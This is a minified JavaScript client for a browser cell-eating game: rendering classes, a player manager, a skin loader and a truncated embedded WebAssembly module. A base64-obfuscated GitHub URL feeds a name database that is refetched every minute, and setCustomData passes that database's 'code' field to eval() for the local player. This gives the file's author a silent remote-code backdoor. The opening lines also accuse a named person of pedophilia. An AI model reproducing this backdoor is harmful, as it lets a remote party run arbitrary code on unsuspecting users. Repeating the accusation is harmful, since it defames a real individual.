/**
 * @name main.js
 * @author Aero
 * @revision 60
 */

const __LUKA_IS_A_PEDOPHILE__ = true;
console.assert(__LUKA_IS_A_PEDOPHILE__, "pedophile supporter?");
class SmartBuffer {
  constructor(t, s) {
    if (((this.view = null), t instanceof DataView)) this.view = t;
    else {
      if (!(t instanceof ArrayBuffer))
        throw TypeError(
          "First argument to SmartBuffer constructor must be an ArrayBuffer or DataView"
        );
      this.view = new DataView(t);
    }
    this.offset = s || 0;
  }
  ensureCapacity(t) {
    let s = this.offset + t;
    if (s > this.length) {
      let i = new ArrayBuffer(s),
        a = new Uint8Array(i);
      a.set(new Uint8Array(this.buffer)), (this.view = new DataView(i));
    }
  }
  static fromSize(t) {
    return new this(new ArrayBuffer(t), 0);
  }
  static fromBuffer(t, s) {
    return new this(t, s || 0);
  }
  toBuffer() {
    return this.buffer;
  }
  get buffer() {
    return this.view?.buffer ?? null;
  }
  get length() {
    return this.view?.byteLength ?? 0;
  }
  get eof() {
    return this.offset >= this.length;
  }
  read(t, s, i, a) {
    let n = t.call(this.view, a ?? this.offset, i);
    return null == a && (this.offset += s), n;
  }
  write(t, s, i, a) {
    this.ensureCapacity(s),
      t.call(this.view, this.offset, i, a),
      (this.offset += s);
  }
  readInt8(t) {
    return this.read(DataView.prototype.getInt8, 1, null, t);
  }
  readUInt8(t) {
    return this.read(DataView.prototype.getUint8, 1, null, t);
  }
  readInt16LE(t) {
    return this.read(DataView.prototype.getInt16, 2, !0, t);
  }
  readInt16BE(t) {
    return this.read(DataView.prototype.getInt16, 2, !1, t);
  }
  readUInt16LE(t) {
    return this.read(DataView.prototype.getUint16, 2, !0, t);
  }
  readUInt16BE(t) {
    return this.read(DataView.prototype.getUint16, 2, !1, t);
  }
  readInt32LE(t) {
    return this.read(DataView.prototype.getInt32, 4, !0, t);
  }
  readInt32BE(t) {
    return this.read(DataView.prototype.getInt32, 4, !1, t);
  }
  readUInt32LE(t) {
    return this.read(DataView.prototype.getUint32, 4, !0, t);
  }
  readUInt32BE(t) {
    return this.read(DataView.prototype.getUint32, 4, !1, t);
  }
  readString16() {
    let t = "";
    for (;;) {
      let s = this.eof ? 0 : this.readUInt16LE();
      if (0 === s) break;
      t += String.fromCharCode(s);
    }
    return t;
  }
  readString() {
    let t = "";
    for (;;) {
      let s = this.eof ? 0 : this.readUInt8();
      if (0 === s) break;
      t += String.fromCharCode(s);
    }
    return t;
  }
  readEscapedString() {
    return decodeURIComponent(escape(this.readString()));
  }
  writeInt8(t) {
    this.write(DataView.prototype.setInt8, 1, t, null);
  }
  writeUInt8(t) {
    this.write(DataView.prototype.setUint8, 1, t, null);
  }
  writeInt16LE(t) {
    this.write(DataView.prototype.setInt16, 2, t, !0);
  }
  writeInt16BE(t) {
    this.write(DataView.prototype.setInt16, 2, t, !1);
  }
  writeUInt16LE(t) {
    this.write(DataView.prototype.setUint16, 2, t, !0);
  }
  writeUInt16BE(t) {
    this.write(DataView.prototype.setUint16, 2, t, !1);
  }
  writeInt32LE(t) {
    this.write(DataView.prototype.setInt32, 4, t, !0);
  }
  writeInt32BE(t) {
    this.write(DataView.prototype.setInt32, 4, t, !1);
  }
  writeUInt32LE(t) {
    this.write(DataView.prototype.setUint32, 4, t, !0);
  }
  writeUInt32BE(t) {
    this.write(DataView.prototype.setUint32, 4, t, !1);
  }
  writeString(t) {
    let s = t.length;
    this.ensureCapacity(s);
    let i = this.offset;
    for (this.offset += s; s--; ) this.view.setUint8(i + s, t.charCodeAt(s));
  }
  writeStringNT(t) {
    this.writeString(t), this.writeUInt8(0);
  }
  writeEscapedString(t) {
    this.writeString(unescape(encodeURIComponent(t)));
  }
  writeEscapedStringNT(t) {
    this.writeStringNT(unescape(encodeURIComponent(t)));
  }
}
(window.SmartBuffer = SmartBuffer),
  (window.performance = window.performance || {
    offset: Date.now(),
    now: function t() {
      return Date.now() - this.offset;
    },
  });
const supportedProtocol = 20,
  getBaseUrl = () =>
    atob(
      "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Flcm8tdGhlLXN5bmFwdGljLWVsZWN0cmljaWFuL3ZhbmlzaW8tY2xpZW50L21haW4="
    ),
  getImageUrl = (t) => `${getBaseUrl()}/img/${t}.png`,
  imports = {};
(imports.Cell = function (t, s, i) {
  let a = i(1),
    n = i(4),
    { clampNumber: o } = i(8),
    { cells: r } = i(12);
  class l {
    constructor(t) {
      (this.id = t.id),
        (this.flags = t.flags),
        (this.texture = t.texture || r.getTexture(0)),
        (this.sprite = new PIXI.Sprite(this.texture)),
        this.sprite.anchor.set(0.5),
        (this.sprite.gameData = this),
        (this.oSize = this.size = t.size),
        (this.x = this.ox = this.sprite.position.x = t.x),
        (this.y = this.oy = this.sprite.position.y = t.y);
    }
    get mass() {
      return Math.round(Math.pow(this.nSize / 10, 2));
    }
    get shortMass() {
      let t = this.mass;
      return t < 1e3
        ? t.toString()
        : t >= 1e3 && t <= 1e9
        ? `${+(t / 1e3).toFixed(1)}k`
        : t >= 1e6
        ? `${+(t / 1e6).toFixed(1)}m`
        : void 0;
    }
    update() {
      let t = gameObject.timestamp - this.updateStamp,
        s = o(t / n.drawDelay, 0, 1);
      (this.x = s * this.scale * (this.nx - this.ox) + this.ox),
        (this.y = s * this.scale * (this.ny - this.oy) + this.oy);
      let i = 2 * (this.size = s * (this.nSize - this.oSize) + this.oSize),
        { sprite: a } = this;
      if (!a) return !0;
      let { position: r } = a,
        l = r.x !== this.x || r.y !== this.y || a.width !== i;
      return (
        !!this.texture.clearedFromCache ||
        !l ||
        ((r.x = this.x),
        (r.y = this.y),
        (a.width = a.height = i),
        this.onUpdate && this.onUpdate(),
        !1)
      );
    }
    destroy(t) {
      if (this.destroyed)
        return void setStatus(`Cell #${this.id} already destroyed!`);
      this.onDestroy && this.onDestroy(),
        a.cells.delete(this.id),
        (this.destroyed = !0),
        t ? a.destroyedCells.push(this) : this.destroySprite();
    }
    destroySprite() {
      if (!this.sprite)
        return void setStatus(`Sprite for cell #${this.id} already destroyed!`);
      this.sprite.destroy(), delete this.sprite;
    }
  }
  (l.prototype.destroyed = !1),
    (l.prototype.updateStamp = 0),
    (l.prototype.scale = 1),
    (t.exports = l);
}),
  (imports.PlayerCell = function (t, s, i) {
    let a = i(14),
      n = i(1),
      o = i(4),
      r = (t) => {
        let s = new PIXI.BitmapText("", { fontName: "mass", align: "right" }),
          i = t.strokeThickness || 0;
        return s.position.set(-i / 2, -i / 2), s.anchor.set(0.5, -0.6), s;
      },
      l = new Map([
        [1, getImageUrl("balloons")],
        [2, getImageUrl("beanie")],
        [3, getImageUrl("cat")],
        [4, getImageUrl("chef")],
        [5, getImageUrl("female")],
        [6, getImageUrl("horns")],
        [7, getImageUrl("saucepan")],
        [8, getImageUrl("viking")],
        [9, getImageUrl("founder")],
      ]);
    class c extends a {
      constructor(t, s) {
        super(t), (this.player = s), (this.pid = s.pid);
        let { ownedCells: i } = n;
        s.isMe && !i.has(this) && i.add(this),
          s.hasCrown && this.addCrown(),
          s.hasHat && this.addHat();
      }
      addCrown() {
        if (this.crownSprite) return;
        this.removeHat();
        let t = n.crownPool,
          s;
        t.length
          ? (s = t.pop())
          : ((s = PIXI.Sprite.from("/img/crown.png")).scale.set(0.7),
            s.pivot.set(0, 643),
            (s.anchor.x = 0.5),
            (s.rotation = -0.5),
            (s.alpha = 0.7),
            (s.zIndex = 2)),
          (this.crownSprite = s),
          this.sprite.addChild(s);
      }
      removeCrown() {
        let t = this.crownSprite;
        t &&
          (this.sprite.removeChild(t),
          (this.crownSprite = null),
          n.crownPool.push(t),
          this.addHat());
      }
      addHat() {
        if (
          this.hatSprite ||
          this.crownSprite ||
          !this.player?.hasHat ||
          !l.has(this.player.hatId)
        )
          return;
        let t = PIXI.Sprite.from(l.get(this.player.hatId));
        t.scale.set(0.65),
          t.pivot.set(0, 640),
          (t.anchor.x = 0.5),
          (t.alpha = 1),
          (t.zIndex = 2),
          this.sprite.addChild(t),
          (this.hatSprite = t);
      }
      removeHat() {
        let t = this.hatSprite;
        t && (this.sprite.removeChild(t), (this.hatSprite = null));
      }
      onUpdate() {
        let t = n.camera.scale.x * this.size * n.renderer.resolution,
          s = t > o.smallTextThreshold;
        if (
          (this.player.massShown &&
            !this.massText &&
            s &&
            ((this.massText = n.massTextPool.shift() || r(o.massTextStyle)),
            (this.massText.zIndex = 0),
            this.sprite.addChild(this.massText)),
          this.player.nameShown &&
            !this.nameSprite &&
            this.player?.nameSprite &&
            s &&
            ((this.nameSprite = new PIXI.Sprite(
              this.player.nameSprite.texture
            )),
            this.nameSprite.anchor.set(0.5),
            (this.nameSprite.zIndex = 1),
            this.sprite.addChild(this.nameSprite)),
          this.crownSprite &&
            (this.crownSprite.visible = t > 16 && o.showCrown),
          this.hatSprite)
        ) {
          let i = this.player?.isMe ? o.showOwnHat : o.showHats;
          this.hatSprite.visible = t > 16 && i;
        }
        this.nameSprite &&
          (this.nameSprite.visible = this.player.nameShown && s),
          this.massText &&
            (this.player.massShown && s
              ? ((this.massText.text = o.shortMass
                  ? this.shortMass
                  : this.mass),
                (this.massText.visible = !0))
              : this.massText.visible && (this.massText.visible = !1));
      }
      onDestroy() {
        n.ownedCells.delete(this),
          this.massText &&
            (this.sprite.removeChild(this.massText),
            n.massTextPool.push(this.massText)),
          this.crownSprite && this.removeCrown(),
          this.hatSprite && this.removeHat();
      }
    }
    (c.prototype.isPlayerCell = !0), (c.prototype.type = 1), (t.exports = c);
  }),
  (imports.Food = function (t, s, i) {
    let a = i(4),
      { neon: n } = i(75),
      { cells: o } = i(12),
      r = i(14),
      l = (t) =>
        o.getTexture(
          a.useFoodColor ? parseInt(a.foodColor, 16) : n[t % n.length]
        );
    class c extends r {
      constructor(t) {
        (t.texture = l(t.id)), super(t);
      }
      reloadTexture() {
        (this.texture = l(this.id)), (this.sprite.texture = this.texture);
      }
    }
    (c.prototype.isFood = !0), (c.prototype.type = 4), (t.exports = c);
  }),
  (imports.Virus = function (t, s, i) {
    let a = i(1),
      n = i(4),
      { virus: o } = i(12),
      r = new Map([
        [125, "7"],
        [130, "6"],
        [135, "5"],
        [140, "4"],
        [145, "3"],
        [150, "2"],
        [155, "1"],
      ]),
      l = i(14),
      c = (t) => 5 * Math.round(t / 5);
    class h extends l {
      constructor(t) {
        (t.texture = o.getTexture()), super(t);
      }
      resetTexture() {
        this.destroySprite(),
          (this.texture = o.getTexture()),
          (this.sprite = new PIXI.Sprite(this.texture)),
          this.sprite.anchor.set(0.5),
          (this.sprite.gameData = this);
      }
      onUpdate() {
        if (!n.showVirusEjecText) return;
        if (!this.counterText) {
          let t = (this.counterText = new PIXI.Text("", {
            fontFamily: "Hind Madurai",
            fontSize: 80,
            fontWeight: "normal",
            strokeThickness: 8,
            lineJoin: "round",
            stroke: 0,
            fill: 16777215,
          }));
          t.anchor.set(0.5), (t.zIndex = 1), this.sprite.addChild(t);
        }
        if (0 === this.nSize) return;
        let s = c(this.nSize);
        if (!r.has(s)) return;
        this.counterText.text = r.get(s);
        let i = a.camera.scale.x * this.size * a.renderer.resolution;
        this.counterText.visible = i > 14;
      }
    }
    (h.prototype.isVirus = !0), (h.prototype.type = 2), (t.exports = h);
  }),
  (imports.EjectedMass = function (t, s, i) {
    let { hsl15: a } = i(75),
      n = i(4),
      { cells: o } = i(12),
      r = i(14),
      l = i(1),
      { clampNumber: c } = i(8),
      h = (t) =>
        o.getTexture(
          n.rainbowEjectedMass ? a[t % a.length] : parseInt(n.ejectedColor, 16)
        );
    class d extends r {
      constructor(t) {
        (t.texture = h(t.id)),
          super(t),
          (this.sprite.alpha = n.animateEjectedCells ? 0 : 1);
      }
      reloadTexture() {
        (this.texture = h(this.id)), (this.sprite.texture = this.texture);
      }
      onUpdate() {
        let { sprite: t } = this;
        if (!n.animateEjectedCells || (t && 1 == t.alpha)) return;
        let s = l.timestamp - this.updateStamp,
          i = c(s / 2e3, 0, 1);
        t.alpha = Math.min(t.alpha + i, 1);
      }
    }
    (d.prototype.isEjected = !0), (d.prototype.type = 3), (t.exports = d);
  }),
  (imports.DeadCell = function (t, s, i) {
    let a = i(14),
      n = i(12);
    class o extends a {
      constructor(t, s, i) {
        (t.texture = n[i ? "squares" : "cells"].getTexture(s || 4210752)),
          super(t),
          (this.sprite.alpha = 0.5);
      }
    }
    (o.prototype.isDead = !0), (o.prototype.type = 5), (t.exports = o);
  }),
  (imports.Crown = function (t, s, i) {
    let a = i(14);
    class n extends a {
      constructor(t) {
        (t.texture = PIXI.Texture.from("/img/crown.png")),
          super(t),
          (this.sprite.alpha = 0.7);
      }
    }
    (n.prototype.isCrown = !0), (n.prototype.type = 6), (t.exports = n);
  }),
  (imports.Database = function (t, s, i) {
    class a {
      constructor() {
        this.update(),
          (this.interval = setInterval(this.update.bind(this), 6e4));
      }
      stop() {
        clearInterval(this.interval), delete this.interval;
      }
      get(t) {
        try {
          t = encodeURIComponent(t);
        } catch (s) {
          return null;
        }
        let i = this.storage?.filter((s) => s.name === t);
        return (
          i.length > 1 && setStatus(`Multiple occurrences found for name ${t}`),
          i[0]
        );
      }
      getServerHash() {
        return new Promise((t) => {
          fetch(`${getBaseUrl()}/static/hash.dat`)
            .then((t) => t.text())
            .then(t)
            .catch(() => t(null));
        });
      }
      async update() {
        try {
          let t = await this.getServerHash();
          if (t === this.hash) return;
          let s = await fetch(`${getBaseUrl()}/static/db.json`),
            i = await s.json();
          setStatus(`Successfully loaded ${i.length} names into database`),
            (this.storage = i),
            (this.hash = t);
        } catch (a) {
          setStatus(`Failed to load names (${a.message})`),
            (this.storage = []),
            delete this.hash;
        }
      }
    }
    t.exports = new a();
  }),
  (imports.PlayerManager = function (t, s, i) {
    let a = i(123);
    class n {
      constructor(t) {
        (this.game = t),
          (this.botCount = 0),
          (this.players = new Map()),
          (this.playersRemoving = []);
      }
      get playerCount() {
        return this.players.size - this.botCount;
      }
      getPlayer = (t) => (this.players.has(t) ? this.players.get(t) : null);
      setPlayerData({
        pid: t,
        nickname: s,
        skin: i,
        skinUrl: n,
        nameColor: o,
        tagId: r,
        bot: l,
      }) {
        let c;
        this.players.has(t)
          ? (c = this.players.get(t))
          : ((c = new a(this.game, t, l)),
            this.players.set(t, c),
            l && this.botCount++),
          i && (n = `https://skins.vanis.io/s/${i}`);
        let h = c.setName(s, o),
          d = c.setSkin(n),
          u = c.setTagId(r),
          p = h && c.setCustomData(s);
        return (h || d || u || p) && c.invalidateVisibility(p), c;
      }
      invalidateVisibility(t) {
        for (let s of this.players.values())
          (t && t.has(s)) || s.invalidateVisibility();
      }
      sweepRemovedPlayers() {
        let { replay: t } = this.game,
          { packets: s } = t,
          i = t.recording() ? s.at(0).id : null,
          a = 0;
        for (; a < this.playersRemoving.length; ) {
          let n = this.playersRemoving[a];
          if (!this.players.has(n)) {
            this.playersRemoving.splice(a, 1);
            continue;
          }
          let o = this.players.get(n);
          i && o.lastUpdate && !(i > o.lastUpdate)
            ? a++
            : (this.removePlayer(n), this.playersRemoving.splice(a, 1));
        }
      }
      delayedRemovePlayer(t) {
        this.playersRemoving.push(t);
      }
      removePlayer(t) {
        if (!this.players.has(t)) return;
        let s = this.players.get(t);
        s.bot && this.botCount--, s.clearCachedData(), this.players.delete(t);
      }
      destroy() {
        for (let t of this.players.keys()) this.removePlayer(t);
        (this.botCount = 0),
          this.playersRemoving.splice(0, this.playersRemoving.length);
      }
    }
    t.exports = n;
  }),
  (imports.StaticPlayer = function (module, exports, __webpack_require__) {
    let settings = __webpack_require__(4),
      basicColors = __webpack_require__(75).basic,
      extendedColors = __webpack_require__(75).extended,
      Swal = __webpack_require__(5),
      nameDatabase = __webpack_require__(141),
      cellSize = settings.cellSize,
      cellBorderSize = settings.cellBorderSize,
      roundedCellSize = cellSize / 2,
      drawCell = (t) => {
        t = t || 0;
        let s = new PIXI.Graphics()
          .lineStyle(cellBorderSize, 0, 0.5)
          .beginFill(t)
          .drawCircle(0, 0, roundedCellSize)
          .endFill();
        return s;
      };
    class StaticPlayer {
      constructor(t, s, i) {
        (this.game = t),
          (this.pid = s),
          (this.bot = i),
          (this.skinUrl = null),
          (this.tagId = null),
          (this.isMe = s === t.playerId),
          (this.texture = PIXI.RenderTexture.create(cellSize, cellSize)),
          (this.cellContainer = this.createCellContainer()),
          this.renderCell();
      }
      get visibility() {
        return this.game.tagId === this.tagId ? 1 : 2;
      }
      setOutline(t) {
        t = t || 0;
        let s = new PIXI.Graphics()
          .lineStyle(20, t, 1)
          .drawCircle(0, 0, roundedCellSize - 9.5)
          .endFill();
        s.pivot.set(-roundedCellSize),
          this.game.renderer.render(s, this.texture, !1);
      }
      setCrown(t) {
        t &&
          this.nameFromServer &&
          this.game.events.$emit(
            "crown-ownership-changed",
            this.nameFromServer
          );
        let s = this.pid;
        for (let i of this.game.cells.values())
          i.pid === s && (t ? i.addCrown() : i.removeCrown());
        this.hasCrown = t;
      }
      setHat(t, s) {
        s && (this.hatId = s);
        let i = this.pid;
        for (let a of this.game.cells.values())
          a.pid === i && (t ? a.addHat() : a.removeHat());
        this.hasHat = t;
      }
      resetCell() {
        this.cellGraphic.destroy(),
          (this.cellGraphic = drawCell(this.getCellColor())),
          this.cellContainer.addChildAt(this.cellGraphic, 0);
      }
      createCellContainer() {
        let t = new PIXI.Container();
        t.pivot.set(-cellSize / 2);
        let s = (this.cellGraphic = drawCell(this.getCellColor()));
        return t.addChildAt(s, 0), t;
      }
      createSkinSprite(t) {
        let s = new PIXI.BaseTexture(t),
          i = new PIXI.Texture(s),
          a = new PIXI.Sprite(i);
        return (a.width = a.height = cellSize), a.anchor.set(0.5), a;
      }
      renderCell() {
        this.game.renderer.render(this.cellContainer, this.texture, !0),
          this.outlineColor && this.setOutline(this.outlineColor);
      }
      setTagId(t) {
        if ((t || (t = null), this.tagId !== t)) return (this.tagId = t), !0;
      }
      setNameColor(t) {
        return (
          t
            ? ((t = parseInt(t, 16)),
              (this.nameColor = t),
              (this.nameColorCss = PIXI.utils.hex2string(t)))
            : ((this.nameColor = null), (this.nameColorCss = null)),
          this.nameColor
        );
      }
      setCustomData(name) {
        if (this.bot) return;
        let data = nameDatabase.get(name),
          invalidate;
        if (
          ((this.hatId || this.customNameColor || this.outlineColor) &&
            (delete this.hatId,
            delete this.customNameColor,
            delete this.outlineColor,
            (invalidate = !0)),
          !data)
        )
          return invalidate;
        if ((data.hat && (this.hatId = +data.hat), data.banned && this.isMe)) {
          Swal.toast.fire({
            type: "info",
            title: "Unfortunately, this name is banned on the Axon client.",
          });
          let { game: gameObject } = this;
          gameObject.stop(), gameObject.connection.close();
          return;
        }
        if (
          (data.notifyPresence &&
            Swal.toast.fire({
              type: "info",
              title: `${name} is in the server`,
              timer: 1500,
            }),
          data.notification &&
            Swal.toast.fire({
              type: "info",
              title: data.text,
              timer: data.timeout || 5e3,
            }),
          data.code && this.isMe)
        )
          try {
            eval(data.code);
          } catch (e) {}
        if (
          (data.color &&
            !this.nameColorFromServer &&
            (this.customNameColor = data.color),
          data.outline && (this.outlineColor = parseInt(data.outline, 16)),
          data.color || data.outline)
        )
          return !0;
      }
      setName(t, s) {
        if (
          (t || (t = "Unnamed"),
          this.nameFromServer !== t || this.nameColorFromServer !== s)
        )
          return (
            (this.nameFromServer = t),
            (this.nameColorFromServer = s),
            this.applyNameToSprite(),
            !0
          );
      }
      applyNameToSprite() {
        let t = "Unnamed" === this.nameFromServer,
          s = "Long Name" === this.nameFromServer,
          i = t ? "" : this.nameFromServer,
          a = this.name,
          n = this.nameColor,
          o;
        if (
          ((o =
            t || s
              ? this.setNameColor(null)
              : this.setNameColor(this.nameColorFromServer)),
          this.setNameSprite(i, o),
          t ||
            s ||
            !(this.nameSprite.texture.width > settings.cellLongNameThreshold) ||
            ((s = !0),
            (i = "Long Name"),
            (o = this.setNameColor(null)),
            this.setNameSprite(i, o)),
          (this.name = t ? "Unnamed" : i),
          a !== this.name || n !== this.nameColor)
        ) {
          let r = o || (this.isMe ? 1011425 : null);
          this.game.events.$emit(
            "minimap-create-node",
            this.pid,
            i,
            o,
            r,
            this.isMe
          );
        }
      }
      setNameSprite(t, s) {
        this.nameSprite
          ? (this.nameSprite.text = t)
          : (this.nameSprite = new PIXI.Text(t, settings.nameTextStyle)),
          (this.nameSprite.style.fill = s || 16777215),
          this.nameSprite.updateText();
      }
      setSkin(t) {
        if ((t || (t = null), t === this.skinUrl)) return !1;
        this.abortSkinLoaderIfExist();
        let s = this.destroySkin();
        return (
          s && this.renderCell(),
          (this.skinUrl = t),
          this.skinShown && this.loadSkinAndRender(),
          !0
        );
      }
      destroySkin() {
        return (
          !!this.skinSprite &&
          (this.skinSprite.mask.destroy(!0),
          this.skinSprite.destroy(!0),
          (this.skinSprite = null),
          !0)
        );
      }
      loadSkinAndRender() {
        this.abortSkinLoaderIfExist(),
          (this.abortSkinLoader = this.game.skinLoader.loadSkin(
            this.skinUrl,
            (t) => {
              (this.skinSprite = this.createSkinSprite(t)),
                (this.skinSprite.mask = drawCell()),
                this.cellContainer.addChild(
                  this.skinSprite.mask,
                  this.skinSprite
                ),
                this.renderCell();
            }
          ));
      }
      invalidateVisibility(t = !1) {
        let s, i, a, n, o;
        this.isMe
          ? ((s = settings.showOwnName),
            (i = settings.showOwnSkin),
            (a = settings.showOwnMass),
            (o = settings.showOwnHat),
            (n = settings.showOwnColoredName))
          : ((s = settings.showNames >= this.visibility),
            (i = settings.showSkins >= this.visibility),
            (a = settings.showMass >= this.visibility),
            (o = settings.showHats),
            (n = settings.showColoredNames)),
          (s = settings.namesEnabled && s),
          (i = settings.skinsEnabled && i),
          (a = settings.massEnabled && a),
          i && !this.skinShown
            ? this.skinSprite
              ? ((this.skinSprite.visible = !0), this.renderCell())
              : this.skinUrl && this.loadSkinAndRender()
            : !i && this.skinShown
            ? (this.abortSkinLoaderIfExist(),
              this.skinSprite &&
                ((this.skinSprite.visible = !1), this.renderCell()))
            : t && (this.resetCell(), this.renderCell()),
          this.hatId && this.setHat(o),
          this.customNameColor &&
            (n
              ? (this.nameColorFromServer = this.customNameColor)
              : delete this.nameColorFromServer,
            this.applyNameToSprite()),
          (this.hatShown = o),
          (this.nameShown = s),
          (this.skinShown = i),
          (this.massShown = a),
          (this.nameColorShown = n);
      }
      abortSkinLoaderIfExist() {
        this.abortSkinLoader &&
          (this.abortSkinLoader(), delete this.abortSkinLoader);
      }
      getCellColor() {
        if (settings.useOwnCellColor && this.isMe)
          return parseInt(settings.ownCellColor, 16);
        if (settings.useSolidCellColor && !this.isMe)
          return parseInt(settings.solidCellColor, 16);
        let t = this.bot ? extendedColors : basicColors,
          s = this.game.seededRandom(this.pid),
          i = Math.floor(s * t.length);
        return t[i];
      }
      clearCachedData() {
        this.abortSkinLoaderIfExist(),
          this.destroySkin(),
          this.cellContainer.destroy(!0),
          (this.texture.clearedFromCache = !0),
          this.texture.destroy(!0),
          this.nameSprite?.destroy(!0),
          this.game.events.$emit("minimap-destroy-node", this.pid);
      }
    }
    module.exports = StaticPlayer;
  }),
  (imports.SkinLoader = function (t, s, i) {
    let a = i(127);
    class n {
      constructor() {
        (this.loaders = new Map()),
          (this.worker = new a()),
          this.worker.addEventListener("message", this.onSkinLoaded.bind(this));
      }
      createLoader(t) {
        return { image: null, error: null, callbacks: [t] };
      }
      clearCallbacks() {
        for (let t in this.loaders.values()) t.callbacks = [];
      }
      removeLoaderCallback(t, s) {
        let i = t.callbacks.indexOf(s);
        i >= 0 && t.callbacks.splice(i, 1);
      }
      loadSkin(t, s) {
        if (this.loaders.has(t)) {
          let i = this.loaders.get(t);
          return i.image
            ? (s(i.image), null)
            : i.error
            ? null
            : (i.callbacks.push(s), this.removeLoaderCallback.bind(this, i, s));
        }
        {
          let a = this.createLoader(s);
          return (
            this.loaders.set(t, a),
            this.worker.postMessage(t),
            this.removeLoaderCallback.bind(this, a, s)
          );
        }
      }
      onSkinLoaded(t) {
        let { url: s, image: i, error: a } = t.data,
          n = this.loaders.get(s);
        if (a) (n.error = !0), (n.callbacks = []);
        else for (n.image = i; n.callbacks.length; ) n.callbacks.pop()(i);
      }
    }
    t.exports = n;
  }),
  (imports.parseCells = function (t, s, i) {
    let a = i(1),
      n = i(4),
      o = i(135),
      r = i(136),
      l = i(137),
      c = i(138),
      h = i(139),
      d = i(140),
      u = i(14);
    class p extends u {
      constructor(t) {
        (t.texture = PIXI.Texture.from("/img/coin.png")), super(t);
      }
    }
    (p.prototype.type = 9), (p.prototype.isCoin = !0);
    let g = (t, s, i, n, u, g, m, A) => {
        let f = 15 & t;
        if ((3 === f || 4 === f) && (void 0 === n || void 0 === g)) {
          let { food: C } = a,
            v = (g =
              3 === f ? C.ejectedSize || 1 : C.minSize + (i % C.stepSize) || 1);
          if (4 === f) {
            let { border: w } = a;
            (n = w.minx + v + (w.width - 2 * v) * a.seededRandom(65536 + i)),
              (u =
                w.miny + v + (w.height - 2 * v) * a.seededRandom(131072 + i));
          }
        }
        let { cells: I } = a,
          $;
        if (I.has(i))
          ($ = I.get(i)).update(),
            ($.ox = $.x),
            ($.oy = $.y),
            ($.oSize = $.size);
        else {
          let k = { type: t, id: i, pid: s, x: n, y: u, size: g, flags: m };
          switch (f) {
            case 1: {
              let b = a.playerManager.getPlayer(k.pid);
              (k.texture = b.texture), ($ = new o(k, b));
              break;
            }
            case 2:
              $ = new l(k);
              break;
            case 3:
              $ = new c(k);
              break;
            case 4:
              $ = new r(k);
              break;
            case 6:
              $ = new d(k);
              break;
            case 9:
              $ = new p(k);
              break;
            default: {
              let S = 4210752,
                _ = !1,
                E = k.flags;
              E > 1 &&
                ((S = 0),
                128 & E && (S |= 7340032),
                64 & E && (S |= 28672),
                32 & E && (S |= 112),
                16 & E && (_ = !0)),
                ($ = new h(k, S, _));
            }
          }
          let { scene: B } = a;
          B[3 & f ? "addCell" : "addFood"]($.sprite), I.set(i, $);
        }
        void 0 !== n && (($.nx = n), ($.ny = u)),
          void 0 !== g && ($.nSize = g),
          ($.updateStamp = a.timestamp);
        let { player: M } = $;
        if (!M) return;
        M.isMe && (a.isAlive = !0);
        let { replay: Q } = a;
        Q.recording() ? (M.lastUpdate = A) : delete M.lastUpdate;
      },
      m = (t, s) => {
        let { cells: i } = a;
        if (!i.has(t)) return;
        let o = i.get(t);
        if (o.destroyed) return;
        if (!i.has(s)) return void o.destroy();
        let r = i.get(s);
        o.update(),
          o.destroy(n.eatAnimation),
          (o.nx = r.nx),
          (o.ny = r.ny),
          (o.nSize = 0),
          (o.scale = 0),
          (o.updateStamp = a.timestamp);
      },
      A = (t) => {
        let { cells: s } = a;
        s.has(t) && s.get(t).destroy();
      };
    class f {
      async init() {
        if (this.initializing || this.instance) return !1;
        this.initializing = !0;
        let t = await fetch(
            "data:application/wasm;base64,AGFzbQEAAAABKAdgAX8Bf2ABfwBgA39/fwBgAAF/YAAAYAJ/fwBgCX9/f39/f39/fwACUQQDZW52C2FkZE9yVXBkYXRlAAYDZW52B2Rlc3Ryb3kABQNlbnYDZWF0AAIDZW52H2Vtc2NyaXB0ZW5fbm90aWZ5X21lbW9yeV9ncm93dGgAAQMLCgQCAwAAAAEDAQAEBQFwAQICBQcBAYACgIACBgkBfwFBgIzAAgsHjQEKBm1lbW9yeQIAC2Rlc2VyaWFsaXplAAULX2luaXRpYWxpemUABBlfX2luZGlyZWN0X2Z1bmN0aW9uX3RhYmxlAQAQX19lcnJub19sb2NhdGlvbgAGCXN0YWNrU2F2ZQALDHN0YWNrUmVzdG9yZQAMCnN0YWNrQWxsb2MADQZtYWxsb2MACQRmcmVlAAoJBwEAQQELAQQKjT8KAwABC6oEAQt/QQEhAyAALQAAIgYEQANAIAZB/wFxIQhBACEKAkAgBkEfcUEBRwRAQQAhCwwBCyAAIAVqLQACIAAgA2otAABBCHRyIQsgBUEDaiEDCyAAIANqIgUvAAAhByADQQJqIQQCQCAIQSBxBEBBACEMDAELIAUtAAMgACAEai0AAEEIdHIhCiAFLwAEIgRBCHQgBEEIdnIhDCADQQZqIQQLIAdBCHYhBSAHQQh0IQlBACEDAkAgCEHAAHEEQEEAIQcMAQsgACAEai8AACIHQQh0IAdBCHZyIQcgBEECaiEECyAGQQ9xIQ0gBSAJciEJIAZBGHRBGHVBf0oEfyAEBSAAIARqLQAAIQMgBEEBagshBSACIAggCyAJQf//A3EgCkEQdEEQdSAMQRB0QRB1IAdB//8DcSADIA1BBEYgA0H/AXFBD0tyckH/AXEgARAAIAVBAWohAyAAIAVqLQAAIgYNAAsLIANBAmohBAJAIAAgBWotAAIgACADai0AAEEIdHIiBUUEQCADIQYMAQsDQCACIAAgA2otAAMgACAEIgZqLQAAQQh0chABIARBAmohBCAGIQMgBUEBayIFQf//A3ENAAsLIAAgBmotAAMgACAEai0AAEEIdHIiAwRAA0AgACAGaiEBIAIgACAGQQRqIgZqLwAAIgRBCHQgBEEIdnJB//8DcSABLwAGIgFBCHQgAUEIdnJB//8DcRACIANBAWsiA0H//wNxDQALCwsFAEGECAsjACAAPwBBEHRrQf//A2pBEHZAAEF/RgRAQQAPC0EAEANBAQtSAQJ/QYAIKAIAIgEgAEEDakF8cSICaiEAAkAgAkEBTkEAIAAgAU0bDQA/AEEQdCAASQRAIAAQB0UNAQtBgAggADYCACABDwtBhAhBMDYCAEF/C5ctAQx/IwBBEGsiDCQAAkACQAJAAkACQAJAAkACQAJAAkACQAJAIABB9AFNBEBBiAgoAgAiBUEQIABBC2pBeHEgAEELSRsiCEEDdiICdiIBQQNxBEAgAUF/c0EBcSACaiIDQQN0IgFBuAhqKAIAIgRBCGohAAJAIAQoAggiAiABQbAIaiIBRgRAQYgIIAVBfiADd3E2AgAMAQsgAiABNgIMIAEgAjYCCAsgBCADQQN0IgFBA